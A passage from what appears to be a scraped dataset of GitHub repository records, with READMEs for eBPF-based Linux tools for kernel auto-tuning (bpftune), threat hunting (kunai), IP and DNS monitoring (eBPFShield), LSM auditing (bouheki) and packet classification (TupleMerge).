    - subsystem: raw_syscalls
      event: sys_exit
      # args: syscall id
      args:
      - index: 4
        type: int64
      selectors:
      - matchArgs:
        - index: 4
          operator: Equal
          values:
          - ""59""
          - ""322""
```

The args section specifies the argument for the syscall being monitored. In this case, the syscall ID is located at index 4, and the type is specified as int64. This information helps to ensure that the correct value is captured and processed when tracing the sys_exit event for the specified syscall IDs.
<br/><br/>
Please note that the values ""59"" and ""322"" correspond to specific system calls in the Linux kernel. The exact meaning and purpose of these system calls can vary depending on the specific Linux distribution and version you are using. You can refer to the Linux kernel documentation or relevant resources to understand the specific functionality associated with these syscall IDs in your environme"
oracle-samples/bpftune,1678,91,1678,18,C,bpftune uses BPF to auto-tune Linux systems,2023-05-09T14:56:10Z,2025-10-11T00:51:26Z,678,"# bpftune - BPF driven auto-tuning

bpftune aims to provide lightweight, always-on auto-tuning of system
behaviour.  The key benefit it provides are

- by using BPF observability features, we can continuously monitor
  and adjust system behaviour
- because we can observe system behaviour at a fine grain (rather
  than using coarse system-wide stats), we can tune at a finer grain
  too (individual socket policies, individual device policies etc)

## The problem

The Linux kernel contains a large number of tunables; these
often take the form of sysctl(8) parameters, and are usually
introduced for situations where there is no one ""right"" answer
for a configuration choice.  The number of tunables available
is quite daunting.  On a 6.2 kernel we see

```
# sysctl --all 2>/dev/null|wc -l
1624
```

[See here for an excellent writeup on network-related tunables.](https://github.com/leandromoreira/linux-network-performance-parameters).

At the same time, individual systems get a lot less care
and adminstrator attention than they used to; phrases like
""cattle not pets"" exemplify this.  Given the modern cloud
architectures used for most deployments, most systems never
have any human adminstrator interaction after initial
provisioning; in fact given the scale requirements, this
is often an explicit design goal - ""no ssh'ing in!"".

These two observations are not unrelated; in an earlier
era of fewer, larger systems, tuning by administrators was
more feasible.

These trends - system complexity combined with minimal
admin interaction suggest a rethink in terms of tunable
management.

A lot of lore accumulates around these tunables, and to help
clarify why we developed bpftune, we will use a straw-man
version of the approach taken with tunables:

""find the set of magic numbers that will work for the
 system forever""

This is obviously a caricature of how administrators
approach the problem, but it does highlight a critical
implicit assumption - that systems are static.

And that gets to the ""BPF"" in bpftune; BPF provides means
to carry out low-overhead observability of systems. So
not only can we observe the system and tune appropriately,
we can also observe the effect of that tuning and re-tune
if necessary.

## Key design principles

- Minimize overhead.  Use observability features sparingly; do not
  trace very high frequency events.
- Be explicit about policy changes providing both a ""what"" - what
  change was made - and a ""why"" - how does it help? syslog logging
  makes policy actions explicit with explanations
- Get out of the way of the administrator.  We can use BPF
  observability to see if the admin sets tunable values that we
  are auto-tuning; if they do, we need to get out of the way and
  disable auto-tuning of the related feature set.
- Don't replace tunables with more tunables! bpftune is designed to
  be zero configuration; there are no options, and we try to avoid
  magic numbers where possible.
- Use push-pull approaches. For example, with tcp buffer sizing,
  we often want to get out of the way of applications and bump
  up tcp sndbuf and rcvbuf, but at a certain point we run the
  risk of exhausting TCP memory.  We can however monitor if we
  are approaching TCP memory pressure and if so we can tune down
  values that we've tuned up.  In this way, we can let the system
  find a balance between providing resources and exhausting them.
  In some cases, we won't need to tune up values; they may be fine
  as they are. But in other cases these limits block optimal performance,
  and if they are raised safely - with awareness of global memory
  limits - we can get out the way of improved performance.  Another
  concern is that increasing buffer size leads to latency - to
  handle that, we correlate buffer size changes and TCP smoothed
  round-trip time; if the correlation between these exceeds a
  threshold (0.7) we stop increasing buffer size.

## Concepts

The key components are

- tuners: each tuner manages tunables and handles events sent
  from BPF programs to userspace via the shared ring buffer.
  Each tuner has an associated set of tunables that it manages.

- optional strategies: a tuner can specify multiple strategies;
  after running for a while a strategy times out and we assess
  if a better strategy is available.  Each strategy specifies a
	- name
	- description
	- timeout	
	- evaluation function
	- set of BPF program names in tuner associated with strategy

  Strategies are optional and should be set in the tuner init()
  method via bpftune_strategies_add().  See test/strategy
  for a coded example.  When a strategy times out, the various
  evaluation functions are called and the highest-value evaluation
  dictates the next stratgey.

  Strategies provide a way of providing multiple schemes for
  auto-tuning the same set of tunables, where the choice is
  guided by an evaluation of the effectiveness of the strategies.

- events specify a
	- tuner id: which tuner the event is destined for
	- a scenario: what happened
	- an associated netns (if supported)
	- information about the event (IP address etc)

- the tuner then responds to the event guided by the active strategy;
  increase or decrease a tunable value, etc.  Describing the event
  in the log is key; this allows an admin to understand what
  changed and why.

## Architecture

- bpftune is a daemon which manages a set of .so plugin tuners;
  each of these is a shared object that is loaded on start-up.
- tuners can be enabled or disabled; a tuner is automatically
  disabled if the admin changes associated tunables manually.
- tuners share a global BPF ring buffer which allows posting of
  events from BPF programs to userspace.  For example, if the
  sysctl tuner sees a systl being set, it posts an event.
- each tuner has an associated id (set when it is loaded),
  and events posted contain the tuner id.
- each tuner has a BPF component (built using a BPF skeleton)
  and a userspace component.  The latter has init(), fini()
  and event_handler() entrypoints.  When an event is
  received, the tuner id is used to identify the appropriate
  event handler and its event_handler() callback function is run.
- init, fini and event_handler functions are loaded from the
  tuner .so object.
- BPF components should include bpftune.bpf.h; it contains
  the common map definitions (ringbuf, etc) and shared variables
  such as learning rate and tuner ids that each tuner needs.

## Supported tuners

- TCP connection tuner: auto-tune choice of congestion control algorithm.
  See [bpftune-tcp-conn (8)](./docs/bpftune-tcp-conn.rst)
- IP fragmentation tuner: auto-tune IP fragmentation memory limits
  to support fragment reassembly.  See [bpftune-ip-frag (8)](./docs/bpftune-ip-frag.rst)
- neighbour table tuner: auto-tune neighbour table sizes by growing
  tables when approaching full. See [bpftune-neigh (8)](./docs/bpftune-neigh.rst)
- sysctl tuner: monitor sysctl setting and if it collides with an
  auto-tuned sysctl value, disable the associated tuner.  See
  [bpftune-sysctl (8)](./docs/bpftune-sysctl.rst)
- TCP buffer tuner: auto-tune max and initial buffer sizes.  See
  [bpftune-tcp-buffer (8)](./docs/bpftune-tcp-buffer.rst)
- net buffer tuner: auto-tune tunables related to core networking.
  See [bpftune-net-buffer (8)](./docs/bpftune-net-buffer.rst)
- netns tuner: notices addition and removal of network namespaces,
  which helps power namespace awareness for bpftune as a whole.
  Namespace awareness is important as we want to be able to auto-tune
  containers also.  See [bpftune-netns (8)](./docs/bpftune-netns.rst)
- UDP buffer tuner: auto-tune buffers relating to UDP. See
  [bpftune-udp-buffer (8)](./docs/bpftune-udp-buffer.rst)

## Code organization

Both core bpftune.c and individual tuners use the libbpftune library.
It handles logging, tuner init/fini, and BPF init/fini.

Each tuner shared object defines an init(), fini() and event_handler()
function. These respectively set up and clean up BPF and handle events
that originate from the BPF code.

## Getting Started

If building the repository manually, simply run

```
$ make ; sudo make install
```
at the top-level of the repository.  bpftune also supports a

```
$ make pkg
```

target, which will make a bpftune RPM.  See ./buildrpm/bpftune.spec

We can also build with non-standard libdir for distros which do not
use /usr/lib64 like CachyOS; in this case to install to /usr/lib
instead

```
$ make libdir=lib
$ sudo make install libdir=lib
```

To build the following packages are needed (names may vary by distro);

- libbpf, libbpf-devel >= 0.6
- libcap-devel
- bpftool >= 4.18
- libnl3-devel (on some distros like Debian libnl-route-3-dev is needed)
- clang >= 11
- llvm >= 11
- python3-docutils

The bpf components in bpftune can be built via GCC BPF support.
See https://gcc.gnu.org/wiki/BPFBackEnd for details on the BPF backend.
To build with gcc bpf, specify

```
$ GCC_BPF=bpf-unknown-none-gcc make
```

From the kernel side, the kernel needs to support BPF ring buffer
(around the 5.6 kernel, though 5.4 is supported on Oracle Linux
as ring buffer support was backported), and kernel BTF is
required (CONFIG_DEBUG_INFO_BTF=y).  Verify /sys/kernel/btf/vmlinux
is present.

To enable bpftune as a service

```
$ sudo service bpftune start
```

...and to enable it by default

```
$ sudo systemctl enable bpftune
```

bpftune logs to syslog so /var/log/messages will contain details
of any tuning carried out.

bpftune can also be run in the foreground as a program; to redirect
output to stdout/stderr, run

```
$ sudo bpftune -s
```

On exit, bpftune will summarize any tuning done.

Queries of bpftune state can be done via `bpftune -q`.

## Performance Co-Pilot (PCP) Support

Support has been added to export bpftune tunable values to Performance
Co-Pilot via a PMDA (Performance Metric Domain Agent).  It uses
bpftune quereies to populate metrics in PCP via a python-based
PMDA.  See src/pcp/pmdabpftune.python.

To install the PMDA (ensuring pcp and python3-pcp packages are installed
first), simply run

```
$ sudo make install
$ cd /var/lib/pcp/pmdas/bpftune
$ sudo ./Install

```

Once the above has been done, PCP metrics will be available for bpftune
tunables.  To see these:

```
$ pminfo -f bpftune

bpftune.udp_buffer.net.core.rmem_default
    value 212992

bpftune.udp_buffer.net.core.rmem_max
    value 3099438
...
```

The PMDA is also packaged in bpftune-pcp-pmda; see buildrpm/bpftune.spec.

To create grafana dashboards using bpftune tunables, see the
[blog entry here](https://blogs.oracle.com/linux/post/visualising-pcp-metrics-using-grafana)
for details on setting up grafana to handle PCP metric visualization.

From there it is necessary to ensure that pmlogger is logging the metrics
regularly; add something like the following to

/var/lib/pcp/config/pmlogger/config.default

```
log advisory on default {
        bpftune.tcp_buffer.net.ipv4.tcp_rmem
        bpftune.tcp_buffer.net.ipv4.tcp_wmem
        bpftune.tcp_buffer.net.ipv4.tcp_mem
}
```

...and restart pmlogger

```
$ sudo service pmlogger restart
```

Once that is done, it should be possible to create dashboards with
queries of bpftune metrics.  For example here is a simple dashboard
created for the tcp_buffer tuner:

![alt text](bpftune.tcp_buffer.png ""bpftune grafana dashboard for tcp_buffer tuner"")

## Ansible Install Play

Information: If you are using an Fedora Upstream based Distribution you have to enable the correct repository based on the system you are using, because the libbpf-devel package is getting shipped on additional repository, based on the Distribution. You can look it up here: https://pkgs.org/search/?q=libbpf-devel

```
- name: bpftune download, build, install and start service
  hosts: all
  become: true
  vars:
    repo_url: ""https://github.com/oracle/bpftune""
    repo_dest: ""/root/bpftune/""
  tasks:
    - name: Install git and system independent build requirements if not present
      ansible.builtin.package:
        name:
          - git
          - clang            # build requirement
          - llvm             # build requirement
          - bpftool          # build requirement
          - iperf3           # build requirement
          - python3-docutils # build requirement
        state: present

    - name: Gather package manager fact
      ansible.builtin.setup:
        filter: ansible_pkg_mgr
      register: setup_info

    - name: install run and build requirements for bpftune on dnf based systems
      ansible.builtin.dnf:
        name:
          - libbpf       # run requirement
          - libnl3       # run requirement
          - libcap       # run requirement
          - libbpf-devel # build requirement
          - libnl3-devel # build requirement
          - libcap-devel # build requirement
          - clang-libs   # build requirement
          - llvm-libs    # build requirement
        state: present
        # enablerepo: <repository> # !ATTENTION! based on the system you use you have to enable the correct repository based on the system you can look it up here: https://pkgs.org/search/?q=libbpf-devel
      when: setup_info.ansible_facts.ansible_pkg_mgr == ""dnf""

    - name: install build requirements for bpftune on apt based systems
      ansible.builtin.apt:
        name:
          - libbpf-dev        # build requirement
          - libcap-dev        # build requirement
          - libnl-3-dev       # build requirement
          - libnl-route-3-dev # build requirement
        state: present
        install_recommends: false
      when: setup_info.ansible_facts.ansible_pkg_mgr == ""apt""

    - name: Clone or update the bpftune repository if a new version is available
      ansible.builtin.git:
        repo: ""{{ repo_url }}""
        dest: ""{{ repo_dest }}""
        update: true
      register: git_result

    - name: if repository changes rebuild software
      block:
        - name: Run make with taget 'all' for bpftune
          community.general.make:
            chdir: ""{{ repo_dest }}""
            target: all

        - name: Run make with taget 'install' target for bpftune
          community.general.make:
            chdir: ""{{ repo_dest }}""
            target: install

        - name: Check bpftune status
          command: bpftune -S
          register: bpftune_status
          changed_when: false
          failed_when: ""'bpftune works fully' not in bpftune_status.stderr""

        - name: restart and enable bpftune service
          ansible.builtin.service:
            name: bpftune.service
            state: started
            enabled: yes
      when: git_result.changed
```

## Tests

Tests are supplied for each tuner in the tests/ subdirectory.
""make test"" runs all the tests.  Tests use network namespaces
to simulate interactions with remote hosts. See ./TESTING.md
for more details.

## Does my system support bpftune?

Simply run ""bpftune -S"" to see:

```
$ bpftune -S
bpftune works fully
bpftune supports per-netns"
0xrawsec/kunai,984,70,984,10,Rust,Threat-hunting tool for Linux,2023-06-21T14:02:18Z,2025-10-07T19:05:10Z,615,"<div align=""center""><img src=""assets/logo.svg"" width=""500""/></div>

[![CI](https://img.shields.io/github/actions/workflow/status/0xrawsec/kunai/ci.yml?style=for-the-badge)](https://github.com/0xrawsec/kunai/actions/workflows/ci.yml)
[![Downloads](https://img.shields.io/github/downloads/0xrawsec/kunai/total.svg?style=for-the-badge)]()
[![Discord](https://img.shields.io/badge/Discord-chat-5865F2?style=for-the-badge&logo=discord)](https://discord.com/invite/AUMaBvHvNU)

[![GitHub release (with filter)](https://img.shields.io/github/v/release/0xrawsec/kunai?style=for-the-badge&label=stable&color=green)](https://github.com/0xrawsec/kunai/releases/latest)
[![Documentation](https://img.shields.io/badge/docs-stable-blue.svg?style=for-the-badge&logo=docsdotrs)](https://why.kunai.rocks)

<!--
[![GitHub Latest Release](https://img.shields.io/github/v/release/kunai-project/kunai?include_prereleases&style=for-the-badge&label=unstable
)](https://github.com/kunai-project/kunai/releases)
[![Documentation](https://img.shields.io/badge/docs-unstable-orange.svg?style=for-the-badge&logo=docsdotrs)](https://why.kunai.rocks/docs/next/quickstart)
-->

# Leitmotiv

Kunai is a powerful tool designed to bring actionable insights for tasks such as **security monitoring** and **threat hunting** on **Linux** systems. Think of it as the Linux counterpart to Sysmon on Windows, tailored for comprehensive and precise event monitoring.

## Why Kunai Stands Out

- **Chronologically Ordered Events:** Events are processed and delivered in the exact order they occur.
- **On-Host Correlation:** Built-in capabilities for event enrichment and correlation to provide deeper context.
- **Container-Aware:** Fully compatible with Linux namespaces and container technologies, enabling complete tracing of container activities.

## How It Works

Kunai leverages eBPF (Extended Berkeley Packet Filter) technology, with kernel-level probes that capture critical events. These probes send data to a userland program, responsible for tasks like reordering, enriching, and correlating the collected events.

On the implementation side, Kunai is predominantly written in Rust, using the robust [Aya library](https://github.com/aya-rs/aya). This design ensures a self-contained standalone binary, embedding both the eBPF probes and the userland processing logic for ease of deployment.

# FAQ

* **Is it compatible with my OS/Kernel ?** : Check out [the compatibility page](https://why.kunai.rocks/docs/compatibility)
* **What kind of events can IÂ get ?** : Please take a read to [events documentation](https://why.kunai.rocks/docs/events/)
* **Which version should IÂ use ?**: If it is just to test the tool, use the latest build as it is always the best in terms of features and bug fix. However keep in mind that events in **non stable** releases **are subject to change**.

# How to Build the Project?

Before proceeding, please note that a distribution-agnostic, pre-compiled version of Kunai is available on the [release page](https://github.com/kunai-project/kunai/releases/latest). If you simply want to try Kunai, you likely donâ€™t need to build the project yourself.

## With a Docker image

You can use a Docker image that includes everything needed to build the project easily: [Kunai build docker image](https://github.com/kunai-project/kunai-build-docker/).  
This one-size-fits-all solution should work on any Linux distribution.

## Doing everything by hand

### Requirements

Before being able to build everything, you need to install a couple of tools.

* to build many Rust projects (this one included), you need [`rustup`](https://www.rust-lang.org/tools/install)
* to build kunai you need: `clang`, `libbpf-dev` and [`bpf-linker`](https://github.com/aya-rs/bpf-linker)

Example of commands to install requirements on Ubuntu/Debian:

```bash
sudo apt update
sudo apt install -y clang libbpf-dev

# assuming you have rustup and cargo installed
cargo install bpf-linker
```

### Building Kunai

Once you have the **requirements** installed, you are good to go. You can now build the project with **xtask**, a cargo command (specific to this project) to make your life easier.

Building debug version
```bash
cargo xtask build
# find your executable in:Â ./target/x86_64-unknown-linux-musl/debug/kunai
```

Building release version (harder, better, faster, stronger)
```bash
cargo xtask build --release
# find your executable in: ./target/x86_64-unknown-linux-musl/release/kunai
```

### Cross-compiling

#### aarch64

1. Install the proper target using rustup `rustup install target aarch64-unknown-linux-gnu`
2. You need to install appropriate compiler and linker to cross-compile
```bash
# example on ubuntu
sudo apt install gcc-aarch64-linux-gnu
```
4. Cross-compile the project
```bash
# compile the project for with release profile
CC=aarch64-linux-gnu-gcc  cargo xbuild --release --target aarch64-unknown-linux-gnu --linker aarch64-linux-gnu-gcc
```
4. You should find your cross-compiled binary at `./target/aarch64-unknown-linux-gnu/release/kunai`

**NB:** specifying `--linker` option is just a shortcut for setting appropriate RUSTFLAGS env variable when building userland
application.

# Memory Profiling

If one believes Kunai has an issue with memory, here is a way to profile it.

```bash
# compile kunai with debug information for all packages
RUSTFLAGS=""-g"" cargo xbuild

# use heaptrack
sudo heaptrack kunai
```

# Related Work

Sysmon For Linux:Â https://github.com/Sysinternals/SysmonForLinux

# Acknowledgements

* Thanks to all the people behind [Aya](https://github.com/aya-rs), this stuff is just awesome
* Special thanks to [@alessandrod](https://github.com/alessandrod) and [@vadorovsky](https://github.com/vadorovsky)
* Thanks to all the usual guys always supporting my crazy ideas

# Funding

The NGSOTI project is dedicated to training the next generation of Security Operation Center (SOC) operators, focusing on the human aspect of cybersecurity.
It underscores the significance of providing SOC operators with the necessary skills and open-source tools to address challenges such as detection engineering, 
incident response, and threat intelligence analysis. Involving key partners such as CIRCL, Restena, Tenzir, and the University of Luxembourg, the project aims
to establish a real operational infrastructure for practical training. This initiative integrates academic curricula with industry insights, 
offering hands-on experience in cyber ranges.

NGSOTI is co-funded under Digital Europe Programme (DEP) via the ECCC (European cybersecurity competence network and competence centre).
"
sagarbhure/eBPFShield,64,10,64,6,Python,,2023-01-14T06:14:37Z,2025-08-26T22:28:17Z,56,"<h1 align=""center"">
  <img alt=""cgapp logo"" src=""https://github.com/sagarbhure/certificates/blob/main/ebpf%20-%20Copy.PNG"" width=""284px""/><br/>
  <p>Advanced IP-Intelligence & DNS Monitoring using eBPF</p>
</h1>
<p align=""center""><b>ðŸ›¡ï¸ Advanced host monitoring and threat detection with eBPF ðŸ›¡ï¸</b></p>

<p align=""center""><b>eBPFShield</b> is a high-performance <b>security tool</b> that utilizes eBPF and Python to provide real-time <b>IP-Intelligence</b> and <b>DNS monitoring</b>. By executing in kernel space, eBPFShield avoids costly context switches and offers efficient <b>detection</b> and <b>prevention</b> of malicious behavior on your network through monitoring of outbound connections and comparison with <b>threat intelligence</b> feeds. ðŸ” </p>
<div align='center'>
<a href='https://github.com/sagarbhure/eBPFShield/releases'>
  
<img src='https://img.shields.io/github/v/release/chroline/well_app?color=%23FDD835&label=version&style=for-the-badge'>
  
</a>
  
<a href='https://github.com/sagarbhure/eBPFShield/blob/main/LICENSE'>
  
<img src='https://img.shields.io/github/license/chroline/well_app?style=for-the-badge'>

</div>

  ---

## Table of Contents

- [Introduction](#-introduction)
- [Features](#-features)
- [Dependencies](#-dependencies)
- [Usage](#-usage)
- [Sample Output](#sample-output)
- [Contributing](#-contributing)
- [Author](#-author)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## ðŸ“ Introduction

  [![Build Status](https://travis-ci.org/dwyl/esta.svg?branch=master)]()
   [![Known Vulnerabilities](https://snyk.io/test/github/dwyl/hapi-auth-jwt2/badge.svg?targetFile=package.json)]()
[![Build Pass](https://img.shields.io/badge/start%20with-why%3F-brightgreen.svg?style=flat)]()
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)]()

Welcome to eBPFShield, a powerful and intuitive security tool for monitoring and protecting your servers. Featuring both <b>IP-Intelligence</b> and <b>DNS monitoring</b> capabilities, eBPFShield utilizes the power of ebpf and python to provide real-time monitoring and actionable insights for identifying and mitigating potential threats.
  
Say goodbye to constantly monitoring your servers with tcpdump and hello to a more efficient and automated security solution with eBPFShield.

**Available for ~~Windows~~, Linux and Ubuntu.**

<p align=""center"">
  <img src = ""https://github.com/sagarbhure/eBPFShield/blob/main/.github/images/linux_ubuntu.png"" width=350>
</p>

## ðŸ›  Features
A few of the things you can do with eBPFShield:

**Current Features: ðŸ”¥**
  
- **`DNS Monitoring`**: Shows all DNS queries in the system.
- **`IP-Intelligence`**: Monitors outbound connections (tcp/udp) and checks it against threat intelligence lists, block **Malicious Destination**.
Includes script to pull down public threat feeds.


**Feature Roadmap: ðŸ“…**

- Automated IP reputation analysis using **Machine Learning** algorithms
- Support for IPv6 and non-standard DNS ports for improved coverage and detection
- Integration with popular **SIEM** systems for centralized monitoring and alerting
- JSON output for easy integration with a **UI** dashboard
- Detection of DNS packets on non-standard ports
  
 ## ðŸ“¦ Dependencies
 ###### Installation
 
  `apt install python3-bpfcc bpfcc-tools libbpfcc linux-headers-$(uname -r)`
  
 ## ðŸš€ Usage
  This tool monitors outbound connections (tcp/udp, ipv4 only) and checks it against threat intelligence lists. There is a script included that pulls down two public feeds, the list of active tor exit nodes and Talos' IP blacklist. Just run `./update_feeds.sh` in the root directory of this project and it'll populate the `ip_feeds/` directory. You can add your custom lists to that directory as well. 

You can run the `update_feeds.sh` script in a cron job using `crontab` to regularly update the threat intelligence feed list. This ensures that the list stays up-to-date and that eBPFShield is able to detect and prevent the latest threats.

Run `python main.py` to get started. Out of the box it will not take any action, it'll just print violations as it sees them.

```
$ python main.py -h
usage: main.py [-h] [--block {print, dump, suspend, kill}] [--feature {ebpf_ipintelligence, ebpf_monitor}] [--verbose]

optional arguments:
  -h, --help            show this help message and exit
  --block {print, dump, suspend, kill}
  --feature {ebpf_ipintelligence, ebpf_monitor}
  --verbose

```
There are two options supported under `--features` flag:
  - `ebpf_ipintelligence`: monitor and block outbound connections against IP threat intelligence lists using tcp/udp and ipv4.
  - `ebpf_monitor`: displays all DNS queries in the system. 
  
There are four actions currently supported via the `--block` flag:
- `print`: the default action, just writes to the screen and that's it
- `suspend`: send a `SIGSTOP` to the process. This can be useful if you need to keep the process in a state where you can interact with it.
- `kill`: kill the process. This may be useful if all you want to do is immediately stop potentially malicious behavior.
- `dump`: suspend the process, take a core dump of it for forensics, and then kill it.

If you're interested in debugging, the `--verbose` flag may be useful to you. This tells the program to print all connections it sees, not just malicious ones.
  
## Sample Output
### Block Malicious Destination ðŸš«

1. In one terminal with root privileges: `$ sudo python main.py --action kill`
2. In another terminal as any user, let's use curl to send an HTTP request to a Tor exit node and another one to google.

We can see we were alerted to only the two out of three curls and that the first two are killed before the connection can complete. The last curl completes just fine.

```
root@host:~/eBPFShield# python3 main.py  --feature ebpf_ipintelligence --block kill
The program is running. Press Ctrl-C to abort.
Client:b'curl' (pid:140278) was killed by eBPFShield (ip-blacklist:31.41.8.66)
Client:b'curl' (pid:140279) was killed by eBPFShield (ip-blacklist:103.43.12.106)
```

```
root@host:~# curl -v 31.41.8.66
*   Trying 31.41.8.66:80...
* TCP_NODELAY set
Killed
root@host:~# curl -v 103.43.12.106
*   Trying 103.43.12.106:80...
* TCP_NODELAY set
Killed
root@host:~# curl google.com
<HTML><HEAD><meta http-equiv=""content-type"" content=""text/html;charset=utf-8"">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF=""http://www.google.com/"">here</A>.
</BODY></HTML>

```


https://user-images.githubusercontent.com/25385987/212558430-7249ee79-2972-44c2-b3aa-1d315fcae1a3.mp4




### Monitor DNS Traffic ðŸ”
  
```
root@host:~# dig @1.1.1.1 google.com +tcp +short
172.217.160.206

root@host:~# dig @1.1.1.1 geekwire.com +tcp
104.26.14.176
172.67.69.185
104.26.15.176
```
  
```
root@host:~/eBPFShield# python3 main.py --feature ebpf_monitor
The program is running. Press Ctrl-C to abort.
COMM=dig PID=140623 TGID=140624 DEV=ens3 PROTO=TCP SRC=10.XX.20.37 DST=1.1.1.1 SPT=60687 DPT=53 UID=0 GID=0 DNS_QR=0 DNS_NAME=google.com. DNS_TYPE=A
COMM=dig PID=140623 TGID=140624 DEV=ens3 PROTO=TCP SRC=1.1.1.1 DST=10.XX.20.37 SPT=53 DPT=60687 UID=0 GID=0 DNS_QR=1 DNS_NAME=google.com. DNS_TYPE=A DNS_DATA=172.217.160.206

COMM=dig PID=140627 TGID=140628 DEV=ens3 PROTO=TCP SRC=10.XX.20.37 DST=1.1.1.1 SPT=42469 DPT=53 UID=0 GID=0 DNS_QR=0 DNS_NAME=geekwire.com. DNS_TYPE=A
COMM=dig PID=140627 TGID=140628 DEV=ens3 PROTO=TCP SRC=1.1.1.1 DST=10.XX.20.37 SPT=53 DPT=42469 UID=0 GID=0 DNS_QR=1 DNS_NAME=geekwire.com. DNS_TYPE=A DNS_DATA=104.26.14.176
COMM=dig PID=140627 TGID=140628 DEV=ens3 PROTO=TCP SRC=1.1.1.1 DST=10.XX.20.37 SPT=53 DPT=42469 UID=0 GID=0 DNS_QR=1 DNS_NAME=geekwire.com. DNS_TYPE=A DNS_DATA=172.67.69.185
COMM=dig PID=140627 TGID=140628 DEV=ens3 PROTO=TCP SRC=1.1.1.1 DST=10.XX.20.37 SPT=53 DPT=42469 UID=0 GID=0 DNS_QR=1 DNS_NAME=geekwire.com. DNS_TYPE=A DNS_DATA=104.26.15.176
```
  


https://user-images.githubusercontent.com/25385987/212558437-86ed7b2e-2c74-41d5-93b4-3b67a4da949d.mp4




 ## ðŸ¤ Contributing 
  [![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/sagarbhure/eBPFShield/blob/main/CONTRIBUTING.md)
  
  Would you like to contribute to this project? CONTRIBUTING.md has all the details on how to do that.
  
 ## ðŸ™‹â€ Author
Developed by [@sagarbhure](https://www.github.com/sagarbhure) ðŸ”¨ with â¤ï¸ and â˜•, Visit me [ðŸŒsagarbhure.com](https://www.sagarbhure.com).
  
  ðŸ“§ Reach out to me at [mail-id](mailto:sagarbhureaerospace@gmail.com) for any questions or collaborations
 or connect with me on [@LinkedIn](https://www.linkedin.com/in/sagarbhure/) ðŸ’».
  
"
mrtc0/bouheki,91,9,91,13,C,bouheki is KRSI(eBPF+LSM) based Linux security auditing tool.,2021-09-21T12:59:57Z,2025-10-04T14:10:41Z,248,"# bouheki: KRSI(eBPF+LSM) based Linux security auditing tool

bouheki is KRSI(eBPF+LSM) based Linux security auditing tool.  
Security events can be audited and blocked based on the container of the process, and restrictions can be applied to container environments.

# Features

* Restriction rules based on process context, such as command name or UID and more
* Restrictions limited to containers
* Network Access Control
* File Access Control
* Restictions bind mounts from host filesystem to containers

# Getting Started

https://mrtc0.github.io/bouheki

# DEMO

[![asciicast](https://asciinema.org/a/475371.svg)](https://asciinema.org/a/475371)

# LICENSE

bouheki's userspace program is licensed under MIT License.  
eBPF programs inside [pkg/bpf directory](pkg/bpf) are licensed under [GNU General Public License version 2](./pkg/bpf/LICENSE.md).  
"
Asphaltt/eBPF-TupleMerge,5,2,5,0,C,A simplified demo of TupleMerge with pure-bpf. License Apache 2.0 & GPL 2.0,2023-07-02T12:30:40Z,2024-10-22T17:12:35Z,3,"<!--
 Copyright 2023 Leon Hwang.
 SPDX-License-Identifier: Apache-2.0
-->

# eBPF TupleMerge

This is a pure-bpf demo to implement TupleMerge online-classification algorithm.

It's not a generic implementation. It only works with IPv4 five-tuple.

## TupleMerge

TupleMerge is not a simple online-classification algorithm. It's expected to
perform lower operations (*lookup*, *add*, *delete*) cost than other algorithms.

- [TupleMerge: Fast Software Packet Processing for Online Packet Classification](https://nonsns.github.io/paper/rossi19ton.pdf)

Hence, it's really hard to implement it fully with pure-bpf. And, Anton
Protopopov from Isovalent commited a patch to implement a simplified version of
TupleMerge in kernel bpf.

- [[RFC PATCH] bpf: introduce new bpf map type BPF_MAP_TYPE_WILDCARD](https://lore.kernel.org/bpf/20220907080140.290413-1-aspsk@isovalent.com/)

Someone says, why not implement it with pure-bpf?

> As for eBPF, today is different from yesterday, and tomorrow is different from today.
>
> ä¸Žæ—¶ä¿±è¿›çš„ eBPF æ—©å·²ä»Šéžæ˜”æ¯”ã€‚ -- Leon Hwang

With Go+bpf, it's possible to implement a simplest version of TupleMerge.

> Required 5.15+ kernel.

### Go+bpf TupleMerge

Unlike the **BPF_MAP_TYPE_WILDCARD** patch, this implementation is not a generic
one. It only works with IPv4 five-tuple, whose rule description is fixed.

The rule description is:

```JSON
{
    ""saddr"": ""10.11.12.0/24"",
    ""daddr"": ""192.168.1.0/24"",
    ""proto"": ""tcp"",
    ""dport"": ""22"",
    ""sport"": ""1024-65535"",
    ""action"": ""allow"",
    ""priority"": 2
}
```

In XDP, it'll be:

```C
struct acl_rule {
    __u32 table_id;
    __u32 hash;
    __u8 protocol;
    __be32 saddr;
    __be32 smask;
    __be32 daddr;
    __be32 dmask;
    __be16 sport_start;
    __be16 sport_end;
    __be16 dport_start;
    __be16 dport_end;
    __u8 action;
    __u16 _pad;
} __attribute__((packed));
```

Then, in XDP, the matching process is:

1. Iterate ACL rule tables.
2. Hash it and get the bucket index in ACL rule buckets.
3. Get the inner bpf map from ACL rule buckets with the index.
4. Iterate the inner bpf map.
5. Match packet with `table_id`, `hash` and ACL rule.

- Check the source code: [tuplemerge.c](./ebpf/tuplemerge.c).

![TupleMerge](./tuplemerge%20layout.png)

And, it requires Go to prepare the ACL rule tables and ACL rule buckets.

### Go+bpf TupleMerge improvements

Currently, this demo does not support to add/delete ACL rules dynamically.

However, it's not hard to implement them.

And amazingly, it can replace a whole bpf map to reduce the operations impact to
XDP data plane. In other word, adding/deleting an ACL rule is costless for XDP.

#### Add ACL rule

1. Find a compatible ACL rule table.
2. Update the ACL rule table bpf map if requiring a new one.
3. Find a ACL rule bucket in the ACL rule buckets bpf map.
4. Add the ACL rule to the ACL rule bucket.
5. Update the ACL rule bucket to the ACL rule buckets bpf map.

#### Delete ACL rule

1. Find a compatible ACL rule table.
2. Delete the ACL rule table from the ACL rule tables bpf map if no ACL rule
   compatible with it.
3. Find a ACL rule bucket in the ACL rule buckets bpf map.
4. Delete the ACL rule from the ACL rule bucket.
5. Delete the ACL rule bucket from the ACL rule buckets bpf map if no ACL rule
   in it.
6. Or, update the ACL rule bucket to the ACL rule buckets bpf map.

### Go+bpf TupleMerge better performance

The performance of Go+bpf TupleMerge can be improved by less ACL rule tables and
smaller number of max ACL rules in a ACL rule bucket.

It can achieve the better performance this way to specific cases.

### Go+bpf TupleMerge scalability

Because of eBPF extensibility, it can run with a small capacity of ACL rule
buckets. Then, with more and more ACL rules, the ACL rule buckets can be scaled
